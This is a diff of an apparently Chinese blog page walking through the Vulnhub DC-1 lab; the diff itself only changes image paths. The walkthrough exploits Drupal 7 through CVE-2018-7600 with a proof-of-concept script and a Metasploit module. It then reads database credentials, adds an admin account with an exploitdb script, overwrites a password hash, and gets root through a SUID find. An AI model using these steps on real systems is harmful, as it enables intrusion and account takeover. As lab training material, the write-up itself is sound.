@@ -254,12 +254,12 @@
 <p>使用Nmap进行全端口扫描</p>
 <pre><code class="hljs shell">nmap -sS -Pn -p 0-65535 -sV -T4 -O 192.168.93.5</code></pre>
 
-<p><img src="/img/vulnhub/dc-1_1.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_1.png" srcset="/img/loading.gif"></p>
 <p>靶机开放 80 端口，浏览器访问 <code>http://192.168.93.5</code></p>
-<p><img src="/img/vulnhub/dc-1_2.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_2.png" srcset="/img/loading.gif"></p>
 <p>目标是使用Drupal搭建的网站</p>
 <p>通过wappalyzer插件进行指纹识别和查看数据包中响应头信息可以知道使用的是 Drupal 7</p>
-<p><img src="/img/vulnhub/dc-1_3.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_3.png" srcset="/img/loading.gif"></p>
 <p>通过查找 Drupal 历史漏洞，发现可能存在RCE漏洞（CVE-2018-7600）</p>
 <p>利用 <code>https://github.com/FireFart/CVE-2018-7600</code> 该POC进行测试</p>
 <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
@@ -298,7 +298,7 @@ m = re.search(<span class="hljs-string">r&#x27;&lt;input type=&quot;hidden&quot;
     r = requests.post(HOST, data=post_params, params=get_params)
     print(r.text)</code></pre>
 
-<p><img src="/img/vulnhub/dc-1_4.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_4.png" srcset="/img/loading.gif"></p>
 <p>可以成功执行命令</p>
 <p>利用MSF来执行攻击，使用 <code>exploit/unix/webapp/drupal_drupalgeddon2</code> 模块</p>
 <pre><code class="hljs shell">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2
@@ -314,51 +314,51 @@ meterpreter &gt;</code></pre>
 
 <p>攻击成功，获得一个 meterpreter 会话</p>
 <p>查看目录文件，发现 flag1.txt 文件，查看该文件内容</p>
-<p><img src="/img/vulnhub/dc-1_5.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_5.png" srcset="/img/loading.gif"></p>
 <p>根据提示信息，查看站点配置文件，Drupal默认配置文件 <code>sites/default/settings.php</code></p>
-<p><img src="/img/vulnhub/dc-1_6.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_6.png" srcset="/img/loading.gif"></p>
 <p>查看到数据库账号密码，根据提示，登录数据库</p>
 <p>执行shell命令切换到shell环境下，再使用Python获取一个交互式的shell</p>
 <pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;</code></pre>
 
-<p><img src="/img/vulnhub/dc-1_7.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_7.png" srcset="/img/loading.gif"></p>
 <p>使用 <code>mysql -udbuser -p</code> 密码  R0ck3t 登录数据库</p>
-<p><img src="/img/vulnhub/dc-1_8.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_8.png" srcset="/img/loading.gif"></p>
 <p>查看网站管理员用户信息</p>
-<p><img src="/img/vulnhub/dc-1_9.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_9.png" srcset="/img/loading.gif"></p>
 <p>密码Hash无法解密，使用针对 Drupal 7 版本(&lt;=7.31)的攻击脚本增加一个 admin 权限的用户</p>
 <pre><code class="hljs awk">python <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/php/</span>webapps<span class="hljs-regexp">/34992.py -t http:/</span><span class="hljs-regexp">/192.168.93.5 -u admin1 -p admin1</span></code></pre>
 
-<p><img src="/img/vulnhub/dc-1_10.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_10.png" srcset="/img/loading.gif"></p>
 <p>账号添加成功</p>
 <p>还可以采用替换管理员密码Hash的方式，使用加密脚本 <code>scripts/password-hash.sh</code> 生成新的密码Hash</p>
-<p><img src="/img/vulnhub/dc-1_11.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_11.png" srcset="/img/loading.gif"></p>
 <p>在MySQL中执行SQL语句替换掉旧的密码Hash</p>
 <pre><code class="hljs apache"><span class="hljs-attribute">update</span> users set pass=&#x27;$S$Dx/<span class="hljs-number">5</span>adlWsrP<span class="hljs-number">7</span>H<span class="hljs-number">4</span>veXtT<span class="hljs-number">99</span>YHtQzTqBzvNUVbm<span class="hljs-number">1</span>tsIu<span class="hljs-number">6</span>W.k<span class="hljs-number">6</span>cDJN<span class="hljs-number">7</span>O&#x27; where uid=<span class="hljs-number">1</span>;</code></pre>
 
 <p>使用账号密码登录，在Content中拿到flag3</p>
-<p><img src="/img/vulnhub/dc-1_12.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_12.png" srcset="/img/loading.gif"></p>
 <p>根据提示利用 suid 提权，再查看 /etc/shadow 文件</p>
 <p>查找具有root权限的suid的文件</p>
 <pre><code class="hljs shell">find / -user root -perm -4000 -print 2&gt;/dev/null
 find / -perm -u=s -type f 2&gt;/dev/null
 find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</code></pre>
 
-<p><img src="/img/vulnhub/dc-1_13.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_13.png" srcset="/img/loading.gif"></p>
 <p>利用find命令获取到root权限的shell</p>
 <pre><code class="hljs gradle"><span class="hljs-keyword">find</span> . -exec <span class="hljs-regexp">/bin/</span>sh \; -quit</code></pre>
 
-<p><img src="/img/vulnhub/dc-1_14.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_14.png" srcset="/img/loading.gif"></p>
 <p>查看 /etc/shadow 文件，发现存在 flag4 用户</p>
-<p><img src="/img/vulnhub/dc-1_15.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_15.png" srcset="/img/loading.gif"></p>
 <p>查看 <code>/home/flag4/flag4.txt</code> 文件获取flag4</p>
-<p><img src="/img/vulnhub/dc-1_16.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_16.png" srcset="/img/loading.gif"></p>
 <p>搜索所有txt文件，发现 <code>/root/thefinalflag.txt</code></p>
 <pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -name <span class="hljs-string">&quot;*.txt&quot;</span></code></pre>
 
-<p><img src="/img/vulnhub/dc-1_17.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_17.png" srcset="/img/loading.gif"></p>
 <p>查看文件内容得到最后的flag</p>
-<p><img src="/img/vulnhub/dc-1_18.png" srcset="/img/loading.gif"></p>
+<p><img src="/img/vulnhub/dc-1/dc-1_18.png" srcset="/img/loading.gif"></p>
 <p>参考</p>
 <pre><code class="hljs apache"><span class="hljs-attribute">https</span>://mp.weixin.qq.com/s/<span class="hljs-number">7</span>tV<span class="hljs-number">3</span>M_<span class="hljs-number">0</span>m<span class="hljs-number">5</span>T<span class="hljs-number">6</span>GnNvYtSWgFQ - Vulnhub 靶机实战系列：DC -<span class="hljs-number">1</span></code></pre>
 
